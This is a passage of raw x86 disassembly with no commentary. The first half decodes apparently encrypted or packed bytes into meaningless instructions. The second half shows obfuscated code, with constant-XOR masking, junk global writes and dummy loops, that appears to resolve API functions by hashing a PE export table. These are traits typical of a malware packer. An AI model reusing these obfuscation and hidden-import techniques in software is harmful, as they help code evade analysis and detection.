  4080bb:	mov    edi,0xafd806a5
  4080c0:	mov    ah,0x97
  4080c2:	dec    ebp
  4080c3:	cli    
  4080c4:	bswap  ecx
  4080c6:	scas   eax,DWORD PTR es:[edi]
  4080c7:	lea    edi,[ebp+0x49]
  4080ca:	dec    eax
  4080cb:	call   0xb0e5:0x803429a8
  4080d2:	psrlw  mm6,mm1
  4080d5:	and    DWORD PTR [ebp+ecx*8+0x37],esp
  4080d9:	outs   dx,BYTE PTR ds:[esi]
  4080da:	inc    edi
  4080db:	add    al,0x4c
  4080dd:	std    
  4080de:	out    dx,al
  4080df:	call   0x1328:0xdfd4210d
  4080e6:	and    BYTE PTR [ecx+ebx*8+0x3b],bh
  4080ea:	mov    ah,0x4c
  4080ec:	xchg   ebp,eax
  4080ed:	add    ebp,eax
  4080ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080f0:	push   0x270b92df
  4080f5:	(bad)  
  4080f6:	xchg   esp,eax
  4080f7:	xchg   edx,eax
  4080f8:	xchg   esi,eax
  4080f9:	fiadd  DWORD PTR [esi]
  4080fb:	out    0x3f,eax
  4080fd:	outs   dx,BYTE PTR ds:[esi]
  4080fe:	xlat   BYTE PTR ds:[ebx]
  4080ff:	test   eax,0x2ea0f46e
  408104:	rol    BYTE PTR [ebx],0x31
  408107:	add    al,0xb9
  408109:	(bad)  
  40810a:	xor    ebx,DWORD PTR [eax+0x6592745e]
  408110:	inc    ebp
  408111:	xchg   BYTE PTR [ecx-0x1b],dh
  408114:	pop    edx
  408115:	mov    ebp,0xb87034c7
  40811a:	push   esp
  40811b:	jb     0x408137
  40811d:	push   esp
  40811e:	aas    
  40811f:	test   DWORD PTR [ecx+ebp*4+0x190a4c87],ebx
  408126:	loop   0x408119
  408128:	mov    ecx,0x9f7ee953
  40812d:	lods   eax,DWORD PTR ds:[esi]
  40812e:	mov    bl,dl
  408130:	sub    ah,ch
  408132:	div    BYTE PTR [esi]
  408134:	(bad)  
  408135:	lods   eax,DWORD PTR gs:[esi]
  408137:	leave  
  408138:	jno    0x408117
  40813a:	stos   BYTE PTR es:[edi],al
  40813b:	sub    eax,0xab77f79a
  408140:	jo     0x4080fd
  408142:	xor    al,0x87
  408144:	addr16 jmp 0x40817e
  408147:	xor    esi,DWORD PTR [ecx-0x33]
  40814a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40814b:	cdq    
  40814c:	rol    ecx,cl
  40814e:	xor    al,0x76
  408150:	sbb    edx,DWORD PTR [ebp+0xbd75797]
  408156:	sti    
  408157:	sahf   
  408158:	or     ecx,DWORD PTR [eax]
  40815a:	cmp    ebx,eax
  40815c:	sbb    BYTE PTR [eax+0x46],ch
  40815f:	sub    ebx,DWORD PTR [ecx]
  408161:	repz call 0xbb857b0d
  408167:	pop    eax
  408168:	and    eax,0x5d751c63
  40816d:	les    ebx,FWORD PTR [ebx]
  40816f:	jae    0x408157
  408171:	ror    BYTE PTR [edx],0x7d
  408174:	mov    edx,0x59f5da38
  408179:	(bad)  
  40817a:	dec    esi
  40817b:	leave  
  40817c:	pop    esp
  40817d:	xchg   edx,eax
  40817e:	push   ss
  40817f:	mov    ds:0xcf100fef,eax
  408184:	shl    BYTE PTR [esi],cl
  408186:	ins    BYTE PTR es:[edi],dx
  408187:	jno    0x408168
  408189:	and    bl,BYTE PTR [edi-0x5a]
  40818c:	add    DWORD PTR [ebp-0x79],esi
  40818f:	dec    eax
  408190:	or     DWORD PTR [ecx],ecx
  408192:	fidivr WORD PTR [edx-0x56]
  408195:	mov    edx,ecx
  408197:	(bad)  
  408198:	outs   dx,BYTE PTR ds:[esi]
  408199:	xor    eax,0xb94eb8b2
  40819e:	ins    DWORD PTR es:[edi],dx
  40819f:	shr    DWORD PTR [ebp+edi*4+0x4e],1
  4081a3:	cmc    
  4081a4:	mov    ds:0xcd3a551f,eax
  4081a9:	das    
  4081aa:	mov    bh,0x3
  4081ac:	mov    esp,0x8201df71
  4081b1:	pop    ss
  4081b2:	cmp    al,0x30
  4081b4:	fdivr  st(5),st
  4081b6:	jp     0x4081d9
  4081b8:	std    
  4081b9:	mov    dh,BYTE PTR [edx+0x68]
  4081bc:	ins    BYTE PTR es:[edi],dx
  4081bd:	lods   al,BYTE PTR ds:[esi]
  4081be:	dec    eax
  4081bf:	xchg   ebx,eax
  4081c0:	out    dx,al
  4081c1:	mov    ds:0x48499b4,al
  4081c6:	xchg   BYTE PTR [edi-0x42],bh
  4081c9:	jmp    0x43470482
  4081ce:	and    dh,BYTE PTR [ecx-0x69]
  4081d1:	neg    DWORD PTR [eax+eax*8+0x7b]
  4081d5:	sbb    al,BYTE PTR [eax+0x23db447d]
  4081db:	mov    ds:0x1d1ae76b,eax
  4081e0:	imul   esi,DWORD PTR [edi-0x1810c288],0xffffffb0
  4081e7:	lods   eax,DWORD PTR ds:[esi]
  4081e8:	mov    al,ds:0x2277e300
  4081ed:	mov    eax,0x5d7c6ace
  4081f2:	adc    DWORD PTR ss:[edi-0x1c14ee48],edx
  4081f9:	loope  0x4081a7
  4081fb:	cmp    al,0x4c
  4081fd:	pop    edx
  4081fe:	fsub   st,st(1)
  408200:	test   eax,0xf991c42
  408205:	stos   BYTE PTR es:[edi],al
  408206:	ds (bad) 
  408208:	cmp    ah,BYTE PTR [edi-0x4f]
  40820b:	ja     0x408199
  40820d:	and    edx,DWORD PTR [ecx+0x5021e4cf]
  408213:	das    
  408214:	cmp    ecx,esi
  408216:	out    dx,al
  408217:	ret    0x419a
  40821a:	(bad)  
  40821b:	and    BYTE PTR [ebp-0x1a],ch
  40821e:	xor    ecx,esi
  408220:	mov    al,ds:0x5c0f5b7a
  408225:	jae    0x40824c
  408227:	mov    eax,0xdc75414
  40822c:	aas    
  40822d:	sti    
  40822e:	jbe    0x408237
  408230:	repnz mov edx,esi
  408233:	inc    esi
  408234:	sbb    esi,DWORD PTR [ecx-0x340d338d]
  40823a:	test   dl,dh
  40823c:	fwait
  40823d:	cli    
  40823e:	and    eax,0xa5e4d1f4
  408243:	jmp    0x204d372
  408248:	aaa    
  408249:	xor    eax,0x7e1bb450
  40824e:	fbstp  TBYTE PTR [ebp+0x1c5dea17]
  408254:	push   ebp
  408255:	mov    ebp,0x40fb83a1
  40825a:	fisttp WORD PTR [ebx+0x40]
  40825d:	push   0x39f78c6f
  408262:	add    eax,eax
  408264:	or     esi,DWORD PTR [esi+0x63]
  408267:	mov    bl,0xd1
  408269:	stos   DWORD PTR es:[edi],eax
  40826a:	mov    eax,ds:0x886f698b
  40826f:	loop   0x408284
  408271:	repz adc DWORD PTR [esi],esi
  408274:	adc    DWORD PTR [esp+ebx*4],ebx
  408277:	adc    eax,DWORD PTR [esi+0x23bd5955]
  40827d:	jnp    0x4082c7
  40827f:	xor    eax,0x138f3fd1
  408284:	lahf   
  408285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408286:	and    bl,bl
  408288:	enter  0x3a4e,0x8e
  40828c:	inc    ebx
  40828d:	call   0xfe5c:0x864a5b21
  408294:	aad    0xea
  408296:	(bad)  
  408297:	cld    
  408298:	jae    0x4082af
  40829a:	stos   DWORD PTR es:[edi],eax
  40829b:	int    0x2b
  40829d:	ret    
  40829e:	sahf   
  40829f:	xchg   esp,eax
  4082a0:	inc    esi
  4082a1:	pop    ss
  4082a2:	repnz sub dh,ah
  4082a5:	xchg   edx,eax
  4082a6:	dec    esi
  4082a7:	jnp    0x40828a
  4082a9:	mov    ah,0xbc
  4082ab:	sub    al,0x9d
  4082ad:	cmp    al,0x4d
  4082af:	(bad)  
  4082b1:	cmp    ebp,DWORD PTR [ebx+0x42dfaad7]
  4082b7:	fistp  QWORD PTR [ebx-0x31cc6317]
  4082bd:	pusha  
  4082be:	pop    edi
  4082bf:	outs   dx,BYTE PTR ds:[esi]
  4082c0:	pop    ss
  4082c1:	xchg   edi,eax
  4082c2:	mov    eax,DWORD PTR [edx]
  4082c4:	jne    0x4082b0
  4082c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082c7:	add    al,0xe6
  4082c9:	mov    eax,0x6ecf8238
  4082ce:	mov    cl,0x35
  4082d0:	mov    al,ds:0x585fc735
  4082d5:	addr16 inc esi
  4082d7:	call   0xc3da:0x81650387
  4082de:	(bad)  
  4082df:	adc    ah,BYTE PTR [ecx]
  4082e1:	nop
  4082e2:	and    BYTE PTR [ebx+0x5b49ac34],dl
  4082e8:	test   DWORD PTR [edi],esp
  4082ea:	xchg   ebp,eax
  4082eb:	xchg   edi,eax
  4082ec:	mov    dl,0x98
  4082ee:	int3   
  4082ef:	stos   DWORD PTR es:[edi],eax
  4082f0:	adc    cl,bh
  4082f2:	sti    
  4082f3:	js     0x4082f4
  4082f5:	mov    BYTE PTR [ebx-0x80],ah
  4082f8:	rcl    DWORD PTR [edx+0x11d61231],1
  4082fe:	test   eax,0xc9ed7a6a
  408303:	cmp    DWORD PTR [ecx],esi
  408305:	sub    eax,0xf7acd96c
  40830a:	mov    ds:0xeb01d6ff,eax
  40830f:	inc    edx
  408310:	lods   eax,DWORD PTR gs:[esi]
  408312:	add    ebx,DWORD PTR [edi]
  408314:	cmc    
  408315:	pop    esp
  408316:	inc    esp
  408317:	jns    0x408309
  408319:	mov    al,ds:0xfd920060
  40831e:	mov    edi,DWORD PTR [eax-0x66]
  408321:	add    BYTE PTR ds:0xbe594888,0x42
  408328:	pop    esp
  408329:	(bad)  
  40832a:	(bad)  
  40832b:	je     0x4082bf
  40832d:	and    esp,edx
  40832f:	mov    esi,0xa469bec3
  408334:	test   DWORD PTR [ebx],0x282c9e39
  40833a:	aaa    
  40833b:	cs jle 0x4083a5
  40833e:	gs add eax,0x559021bb
  408344:	(bad)  
  408345:	cli    
  408346:	xor    BYTE PTR [eax],ch
  408348:	mov    ah,0xda
  40834a:	mov    eax,0xbb1e0f07
  40834f:	daa    
  408350:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408351:	mov    esp,0xb04d48f6
  408356:	dec    ebx
  408357:	push   ebx
  408358:	push   ss
  408359:	dec    BYTE PTR [ecx+0x2f]
  40835c:	fs popa 
  40835e:	push   0xc154633d
  408363:	xor    eax,0x64af9efe
  408368:	push   ss
  408369:	shr    DWORD PTR [ebx],1
  40836b:	xor    edx,DWORD PTR gs:[edi-0x4c]
  40836f:	out    dx,eax
  408370:	stos   DWORD PTR es:[edi],eax
  408371:	divps  xmm4,xmm3
  408374:	add    ebp,DWORD PTR [ebp+0x503011d6]
  40837a:	jge    0x4083c2
  40837c:	inc    edi
  40837d:	adc    bl,BYTE PTR ds:0xc0db0661
  408383:	or     al,0xa
  408385:	xchg   DWORD PTR [ecx+0x4e71737b],edi
  40838b:	jae    0x4083ca
  40838d:	pop    ss
  40838e:	and    eax,0x7ee22eee
  408393:	xchg   esi,eax
  408394:	inc    edi
  408395:	std    
  408396:	outs   dx,BYTE PTR ds:[esi]
  408397:	leave  
  408398:	popf   
  408399:	mov    BYTE PTR [ebx],al
  40839b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40839c:	rcl    DWORD PTR [ecx],1
  40839e:	jp     0x408342
  4083a0:	pop    esp
  4083a1:	or     BYTE PTR [esp+ecx*4+0x60],bh
  4083a5:	out    dx,al
  4083a6:	cmp    ecx,ebp
  4083a8:	andps  xmm4,XMMWORD PTR [ecx]
  4083ab:	leave  
  4083ac:	sub    eax,0x1e22cf93
  4083b1:	mov    DWORD PTR [ebp-0x4e8acc4f],eax
  4083b7:	lahf   
  4083b8:	xchg   ecx,eax
  4083b9:	sub    edx,DWORD PTR [esi+0x741126b0]
  4083bf:	mov    cl,0x96
  4083c1:	mov    edx,0xdf537c4b
  4083c6:	stc    
  4083c7:	push   esi
  4083c8:	sub    esi,DWORD PTR [ebx+ebx*2]
  4083cb:	push   esi
  4083cc:	fbld   TBYTE PTR [ebp-0x1]
  4083cf:	sub    BYTE PTR [ebp+0x25bb2854],al
  4083d5:	or     al,BYTE PTR [eax+0x59a5a79b]
  4083db:	cdq    
  4083dc:	inc    esi
  4083dd:	int    0x96
  4083df:	mov    bl,0xaa
  4083e1:	daa    
  4083e2:	scas   al,BYTE PTR es:[edi]
  4083e3:	retf   
  4083e4:	loope  0x408430
  4083e6:	adc    eax,0xb5f05e00
  4083eb:	push   edi
  4083ec:	imul   edx,esp,0xffffffe5
  4083ef:	push   0x23
  4083f1:	add    eax,0xa3d26f48
  4083f6:	xchg   esp,eax
  4083f7:	jge    0x4083b6
  4083f9:	or     dh,BYTE PTR [esi]
  4083fb:	add    DWORD PTR [edx+0x34],edi
  4083fe:	ins    BYTE PTR es:[edi],dx
  4083ff:	int3   
  408400:	shl    BYTE PTR [ebx+eiz*2+0x2c],0x40
  408405:	ja     0x408422
  408407:	adc    al,0x71
  408409:	xchg   esp,eax
  40840a:	fs ins DWORD PTR es:[edi],dx
  40840c:	push   ebx
  40840d:	jne    0x4083cf
  40840f:	jecxz  0x4083f6
  408411:	ror    DWORD PTR [edi+0x36],1
  408414:	arpl   WORD PTR [ebx],si
  408416:	add    eax,0x2b411285
  40841b:	xchg   ecx,eax
  40841c:	std    
  40841d:	mov    gs,WORD PTR [ebx-0x59122183]
  408423:	in     al,dx
  408424:	jns    0x4083b3
  408426:	popa   
  408427:	dec    edx
  408428:	xchg   edi,eax
  408429:	pop    ebp
  40842a:	into   
  40842b:	jo     0x408428
  40842d:	xchg   BYTE PTR es:[eax+0x59],dh
  408431:	scas   al,BYTE PTR es:[edi]
  408432:	ins    BYTE PTR es:[edi],dx
  408433:	push   eax
  408434:	xchg   BYTE PTR [ebx],al
  408436:	pop    es
  408437:	sub    eax,0x7f3681
  40843c:	jg     0x4083f6
  40843e:	gs fcmovnb st,st(4)
  408441:	outs   dx,BYTE PTR ds:[esi]
  408442:	stos   BYTE PTR es:[edi],al
  408443:	mov    bl,0xed
  408445:	stc    
  408446:	adc    DWORD PTR [esi],0x81219155
  40844c:	call   0xbfe98b68
  408451:	stc    
  408452:	loop   0x40847f
  408454:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408455:	pop    edi
  408456:	adc    ebp,esp
  408458:	xchg   ch,dh
  40845a:	out    dx,al
  40845b:	xchg   ecx,eax
  40845c:	in     al,dx
  40845d:	fs jbe 0x40841a
  408460:	pop    ebp
  408461:	mov    WORD PTR [ebx-0x45],es
  408464:	out    0xed,al
  408466:	in     eax,dx
  408467:	test   DWORD PTR [edx+ecx*4+0x4],esi
  40846b:	adc    BYTE PTR [eax+0x458bff45],cl
  408471:	ror    BYTE PTR [ebx-0x39cc0bab],1
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x430a1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x430a48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x430a4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x430a20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
  4088df:	jmp    0x408897
  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x430a24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x430a28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
